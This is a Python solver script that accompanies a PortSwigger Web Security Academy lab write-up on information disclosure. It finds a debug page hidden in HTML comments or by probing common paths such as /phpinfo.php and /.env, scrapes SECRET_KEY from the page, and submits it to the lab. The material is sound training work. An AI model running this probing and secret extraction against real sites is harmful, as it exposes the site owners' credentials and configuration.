#!/usr/bin/env python3
"""
Information disclosure on debug page
PortSwigger Web Security Academy -- Information Disclosure

Companion script for the writeup: 02-debug-page.md

What this does:
    Scrapes every HTML comment on the homepage looking for a path reference (the
    "Debug" link is hidden in a comment, not in the visible nav). Falls back to
    probing a short list of common debug paths if no comment yields one. Fetches
    whatever debug page turns up and extracts SECRET_KEY out of phpinfo's HTML
    table layout (<td>SECRET_KEY</td><td>value</td>) or a plain key=value form.

Usage:
    python 02-debug-page.py <lab-url>
    e.g. python 02-debug-page.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

DEBUG_PATHS = [
    "/phpinfo.php", "/info.php", "/debug", "/trace",
    "/server-status", "/server-info", "/.env", "/cgi-bin/phpinfo.php",
]


def extract_secret_key(text: str) -> str | None:
    # phpinfo HTML table: <td>SECRET_KEY</td><td>value</td>
    m = re.search(r"SECRET_KEY.*?<td[^>]*>([^<]+)</td>", text, re.DOTALL)
    if m:
        return m.group(1).strip()
    # Key=value or key: value format
    m = re.search(r"SECRET_KEY[\s\"'=:]+([a-zA-Z0-9_-]+)", text)
    if m:
        return m.group(1).strip()
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, timeout=15, follow_redirects=True)

    r = client.get(lab_url)
    comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
    debug_path = None
    for c in comments:
        paths = re.findall(r"(/[\w/.-]+)", c)
        if paths:
            debug_path = paths[0]
            break

    if not debug_path:
        print("[*] No path in HTML comments -- falling back to common debug paths")
        for p in DEBUG_PATHS:
            pr = client.get(f"{lab_url}{p}")
            if pr.status_code == 200 and ("SECRET_KEY" in pr.text or "phpinfo" in pr.text.lower()):
                debug_path = p
                break

    if not debug_path:
        print("[-] Could not find debug page")
        return

    print(f"[+] Found debug page: {debug_path}")
    dr = client.get(f"{lab_url}{debug_path}")
    secret = extract_secret_key(dr.text)
    if not secret:
        print("[-] Debug page found but no SECRET_KEY extracted")
        return

    print(f"[+] SECRET_KEY: {secret}")
    sr = client.post(f"{lab_url}/submitSolution", data={"answer": secret})
    if "Congratulations" in sr.text or '"correct":true' in sr.text:
        print("[+] Lab solved!")
    else:
        print(f"[!] Submit response: {sr.status_code}")
        print(f"    Response snippet: {sr.text[:300]}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
